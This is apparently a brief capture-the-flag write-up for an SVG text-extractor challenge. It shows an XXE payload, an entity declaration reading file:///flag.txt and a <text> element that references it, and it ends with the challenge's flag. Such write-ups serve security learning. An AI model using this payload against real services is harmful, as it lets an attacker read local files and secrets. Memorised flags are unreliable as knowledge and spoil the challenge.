# svg text extractor

This site was a simple svg text extractor. It displayed text under the `<text>` element for a given svg file.

The solution was to use an XXE attack on the site by embedding `<!ENTITY xxe SYSTEM "file:///flag.txt" >` in the svg and referencing it in the `<text>` element like so:
`<text font-family="Verdana" font-size="16" x="10" y="40">&xxe;</text>`

The flag is: `flag{XXE_is_such_a_forced_acronym___df76d30ceb86}`
